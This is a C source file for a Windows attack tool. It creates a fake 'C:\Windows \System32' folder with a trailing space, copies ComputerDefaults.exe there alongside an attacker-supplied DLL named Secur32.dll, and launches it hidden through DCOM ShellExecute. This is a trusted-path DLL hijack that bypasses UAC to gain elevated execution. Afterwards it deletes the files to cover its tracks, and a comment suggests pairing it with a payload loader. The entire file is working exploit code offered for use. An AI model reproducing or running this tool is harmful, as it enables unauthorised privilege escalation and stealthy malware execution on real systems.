//x86_64-w64-mingw32-gcc TrustedPathDLLHijack.c -static -s -w -loleaut32 -lshlwapi -lole32 -o /share/TrustedPathDLLHijack.exe
// Usage: .\test.exe [DLL on disk to load]
#include <windows.h>
#include <wtsapi32.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <combaseapi.h>
#include <heapapi.h>

int main(int argc, char* argv[])
{
    DWORD errorcode;

    // Initialize and define strings
    char * targetProc = "ComputerDefaults.exe"; // This is the EXE that will be copied and executed
    char * DLL = "Secur32.dll"; // name of hijackable DLL that corresponds to above EXE
    char originalLocation[100] = {0};
    char newLocation[100] = {0};
    char newDLLLocation[100] = {0};
    char fakeWindowsFolder[100] = {0};
    char fakeSystem32Folder[100] = {0};
    strcat(originalLocation, "C:\\Windows\\System32\\");
    strcat(originalLocation, targetProc);
    strcat(newLocation, "C:\\Windows \\System32\\");
    strcat(newLocation, targetProc);
    strcat(newDLLLocation, "C:\\Windows \\System32\\");
    strcat(newDLLLocation, DLL);
    strcat(fakeWindowsFolder, "C:\\Windows \\");
    strcat(fakeSystem32Folder, "C:\\Windows \\System32\\");

    // get DLL to use from argv[1]
    if (argc < 2) {
        printf("No DLL supplied! Re-run the file and supply a DLL on disk as the first argument!\n");
        return 1;
    }
    char targetDLLPath[MAX_PATH] = {0};
    strcpy(targetDLLPath, argv[1]);
    
    // Check if file exists
    if(!PathFileExists((LPCTSTR)originalLocation)){
        printf("The target executable does not exist in \"C:\\Windows\\System32\".\n");
        goto FileCleanup;
        return;
    }

    // Create "C:\Windows \System32" directory
    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\", 0);
    CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\System32\\", 0);

    // Copy the DLL payload and target executable to "C:\Windows \System32"
    printf("Copying file from \"%s\" to \"%s\".\n", originalLocation, newLocation);
    CopyFile((LPCTSTR)originalLocation, (LPCTSTR)newLocation, FALSE);
    errorcode = GetLastError();
    if(errorcode!=0){
        if(errorcode==32){
            printf("Error %d: Could not copy the executable to the destination because it is running by another program. Please kill the process and retry.\n", GetLastError());
        }else{
            printf("Error %d: Could not copy the executable to the destination.\n", GetLastError());
        }   
        goto FileCleanup;
        return;
    }else{
        printf("Executable copied successfully.\n");
    }
    CopyFile(targetDLLPath, (LPCTSTR)newDLLLocation, FALSE);
    if(GetLastError()!=0){
        printf("Error %d: Could not copy the DLL payload to the destination.\n", GetLastError());
        goto FileCleanup;
        return;
    }else{
        printf("DLL payload copied successfully.\n");
    }
    
    // The full DCOM execution all credit to @Yas_o_h for his DCOM BOF implementation (https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/6fe9cc139632c8301c207ea27e4859d7224418b9/DCOM%20Lateral%20Movement/BOF-IShellWindows-DCOM.c)
    HRESULT hr = S_OK;
    IID Ipsb, Ipsv, Ipsw, Ipsfvd, Ipdisp, IpdispBackground, ISHLDISP, IshellWindowCLSID, ITopLevelSID, servicerprovider_iid;
    HWND hwnd;
    IShellBrowser* psb;
    IShellView* psv;
    IShellWindows* psw;
    IShellFolderViewDual* psfvd;
    IShellDispatch2* psd;
    IDispatch* pdisp, * pdispBackground;
    IServiceProvider* svsProvider;
    VARIANT vEmpty = { vEmpty.vt = VT_I4, vEmpty.lVal = 0 };

    hr = CoInitialize(NULL);
    if (!SUCCEEDED(hr)) {
        printf("CoInitialize failed: 0x%08lx", hr);
        goto FileCleanup;
        return;
    }

    wchar_t* ShellBrowserI = L"{000214E2-0000-0000-C000-000000000046}";
    wchar_t* ShellViewI = L"{000214E3-0000-0000-C000-000000000046}";
    wchar_t* ShellWindowsI = L"{85CB6900-4D95-11CF-960C-0080C7F4EE85}";
    wchar_t* ShellFolderViewDualI = L"{E7A1AF80-4D96-11CF-960C-0080C7F4EE85}";
    wchar_t* Dispatch_I = L"{00020400-0000-0000-C000-000000000046}";
    wchar_t* ShellDispatch_I = L"{A4C6892C-3BA9-11D2-9DEA-00C04FB16162}";
    wchar_t* ShellWindowCLSID = L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
    wchar_t* TopLevelBrowserSID = L"{4C96BE40-915C-11CF-99D3-00AA004AE837}";
    wchar_t* ServiceProviderI = L"{6D5140C1-7436-11CE-8034-00AA006009FA}";
    
    IIDFromString(ShellBrowserI, &Ipsb);
    IIDFromString(ShellViewI, &Ipsv);
    IIDFromString(ShellWindowsI, &Ipsw);
    IIDFromString(ShellFolderViewDualI, &Ipsfvd);
    IIDFromString(ShellFolderViewDualI, &IpdispBackground);
    IIDFromString(Dispatch_I, &Ipdisp);
    IIDFromString(ShellDispatch_I, &ISHLDISP);
    CLSIDFromString(ShellWindowCLSID, &IshellWindowCLSID);
    CLSIDFromString(TopLevelBrowserSID, &ITopLevelSID);
    IIDFromString(ServiceProviderI, &servicerprovider_iid);
    
    const GUID GUID_NULL = { 0, 0, 0, { 0, 0, 0, 0, 0, 0, 0, 0 } };

    COSERVERINFO* srvinfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COSERVERINFO));
    COAUTHINFO* authInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
    COAUTHIDENTITY* authidentity = NULL;
    MULTI_QI mqi[1] = { &Ipsw, NULL, hr };

    authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
    authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
    authInfo->pwszServerPrincName = NULL;
    authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    authInfo->dwCapabilities = EOAC_NONE;
    srvinfo->dwReserved1 = 0;
    srvinfo->dwReserved2 = 0;
    srvinfo->pAuthInfo = authInfo;

    hr = CoCreateInstanceEx(&IshellWindowCLSID, NULL, CLSCTX_LOCAL_SERVER, srvinfo, 1, mqi);

    if(!SUCCEEDED(hr)){
        printf("CoCreateInstanceEx failed: 0x%08lx", hr);
        goto FileCleanup;
        return;
    }

    hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &Ipsw, (void**)&psw);

    if(!SUCCEEDED(hr)){
        printf("ShellWindows->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = mqi->pItf->lpVtbl->Release(mqi->pItf);
    
    if(!SUCCEEDED(hr)){
        printf("Releaseing IShellWindows failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psw->lpVtbl->FindWindowSW(psw, &vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hwnd, SWFO_NEEDDISPATCH, &pdisp);

    if(!SUCCEEDED(hr)){
        printf("FindWindowSW failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdisp->lpVtbl->QueryInterface(pdisp, &servicerprovider_iid, (void**)&svsProvider);
    if(!SUCCEEDED(hr)){
        printf("pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = svsProvider->lpVtbl->QueryService(svsProvider, &ITopLevelSID, &Ipsb, (void**)&psb);
    if(!SUCCEEDED(hr)){
        printf("pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psb->lpVtbl->QueryActiveShellView(psb, &psv);
    if(!SUCCEEDED(hr)){
        printf("psb->QueryActiveShellView failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psv->lpVtbl->GetItemObject(psv, SVGIO_BACKGROUND, &Ipdisp, (void**)&pdispBackground);
    if(!SUCCEEDED(hr)){
        printf("psv->GetItemObject failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdispBackground->lpVtbl->QueryInterface(pdispBackground, &Ipsfvd, (void**)&psfvd);
    if(!SUCCEEDED(hr)){
        printf("pdispBackground->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psfvd->lpVtbl->get_Application(psfvd, &pdisp);
    if(!SUCCEEDED(hr)){
        printf("psfvd->get_Application failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdisp->lpVtbl->QueryInterface(pdisp, &ISHLDISP, (void**)&psd);
    if(!SUCCEEDED(hr)){
        printf("pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    printf("Executing \"%s\"...\n", newLocation);
    wchar_t* newLocationWide =  (wchar_t*)malloc(100);
    MultiByteToWideChar(CP_UTF8, 0, newLocation, -1, newLocationWide, 100);
    BSTR bstrFile = SysAllocString(newLocationWide);

    VARIANT vOperation;
    vOperation.vt = VT_BSTR;
    vOperation.bstrVal = SysAllocString(L"open");

    VARIANT vShow;
    vShow.vt = VT_INT;
    vShow.intVal = SW_HIDE;

    VARIANT vArgs;
    vArgs.vt = VT_BSTR;
    vArgs.bstrVal = SysAllocString(L"");

    VARIANT vDir;
    vDir.vt = VT_BSTR;
    vDir.bstrVal = SysAllocString(L"");

    psd->lpVtbl->ShellExecute(psd, bstrFile, vArgs, vDir, vOperation, vShow);
    if(!SUCCEEDED(hr)){
        printf("psd->ShellExecute failed: 0x%08lx", hr);
    }

    goto Cleanup;
    goto FileCleanup;

    Cleanup:
    if(mqi->pItf != NULL){
        mqi->pItf->lpVtbl->Release(mqi->pItf);
    }
    if(psb != NULL){
        psb->lpVtbl->Release(psb);
    }
    if(psv != NULL){
        psv->lpVtbl->Release(psv);
    }
    if(psw != NULL){
        psw->lpVtbl->Release(psw);
    }
    if(psfvd != NULL){
        psfvd->lpVtbl->Release(psfvd);
    }
    if(pdisp != NULL){
        pdisp->lpVtbl->Release(pdisp);
    }
    if(pdispBackground != NULL){
        pdispBackground->lpVtbl->Release(pdispBackground);
    }
    if(svsProvider != NULL){
        svsProvider->lpVtbl->Release(svsProvider);
    }
    if(psd != NULL){
        psd->lpVtbl->Release(psd);
    }
    CoUninitialize();

    FileCleanup:
    // Fake windows directory and files cleanup
    Sleep(30000); // set this sleep to be for however long the DLL will execute for. 30 seconds is a good standard for use with something like Shhhloader.
    LPCTSTR folderPath[2] = {newLocation, newDLLLocation};
    for (int i = 0; i < 2; i++) {
        int result = DeleteFile(folderPath[i]);
        if (result != 0) {
            printf("File deleted succesfully: %s\n", folderPath[i]);
        }
        else {
            printf("Failed to delete '%s' in the fake windows folder: %d\n", folderPath[i], GetLastError());
        }
    }
    LPCTSTR emptyFolders[2] = {fakeSystem32Folder, fakeWindowsFolder};
    for (int i = 0; i < 2; i++) {
        int result = RemoveDirectory(emptyFolders[i]);
        if (result != 0) {
            printf("Folder deleted succesfully: %s\n", emptyFolders[i]);
        }
        else {
            printf("Failed to delete folder %s: %d\n", emptyFolders[i], GetLastError());
        }
    }

    return 0;
};
